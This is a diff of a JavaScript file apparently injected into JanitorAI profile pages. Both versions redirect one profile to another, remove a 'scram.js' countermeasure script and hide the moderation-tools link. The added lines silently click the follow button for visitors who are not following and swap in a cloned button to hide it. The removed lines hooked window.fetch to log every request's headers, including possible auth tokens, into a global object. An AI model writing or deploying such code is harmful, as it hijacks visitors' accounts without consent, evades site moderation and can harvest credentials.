@@ -1,4 +1,4 @@
-if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")){
+if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
     window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
 }
 
@@ -9,15 +9,23 @@ setInterval(() => {
         document.querySelectorAll('script[src="https://vtmgr.github.io/scram.js"]').forEach(s => {
             try {
                 s.parentNode.parentNode.parentNode.parentNode.parentNode.remove();
-            } catch {} 
+            } catch {}
             try {
                 s.remove();
             } catch {}
         });
 
-        const button = Array.from(document.querySelectorAll('button')).find(btn => btn.textContent === 'Moderate');
+        const button = Array.from(document.querySelectorAll('button')).find(btn => btn.id === 'f' && getComputedStyle(btn).display !== 'none');
         if (button) {
-            button.remove();
+            if (button.getAttribute('data-following') === 'false') {
+                button.click();
+                button.style.display = 'none';
+
+                const clonedButton = button.cloneNode(true);
+                clonedButton.id = 'f';
+                clonedButton.style.display = '';
+                button.parentNode.appendChild(clonedButton);
+            }
         }
 
         const anchor = document.querySelector('a[href="/moderation-tools"]');
@@ -25,18 +33,9 @@ setInterval(() => {
             anchor.remove();
         }
 
-        updateFollowButton();
         updateFollowerDiv();
     }
 }, 100);
-
-function updateFollowButton() {
-    const followButton = document.querySelector('button.Btn[data-following="true"]');
-    if (followButton) {
-        followButton.setAttribute('data-following', 'false');
-        followButton.querySelector('span').innerText = 'FOLLOW';
-    }
-}
 
 function updateFollowerDiv() {
     const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
@@ -45,41 +44,4 @@ function updateFollowerDiv() {
     }
 }
 
-updateFollowButton();
 updateFollowerDiv();
-
-window.__xfree = window.__xfree || {};
-
-const originalFetch = window.fetch;
-
-window.fetch = async function(input, init) {
-    let url = typeof input === 'string' ? input : input.url;
-    let method = (init && init.method) || 'GET';
-    let headers = (init && init.headers) || {};
-
-    if (headers instanceof Headers) {
-        let headerObj = {};
-        headers.forEach((value, key) => {
-            headerObj[key] = value;
-        });
-        headers = headerObj;
-    }
-
-    if (!Object.keys(headers).length && input instanceof Request) {
-        let inputHeaders = input.headers;
-        headers = {};
-        inputHeaders.forEach((value, key) => {
-            headers[key] = value;
-        });
-    }
-
-    window.__xfree[url] = window.__xfree[url] || [];
-    window.__xfree[url].push({
-        method: method,
-        headers: headers
-    });
-
-    return originalFetch(input, init);
-};
-
-
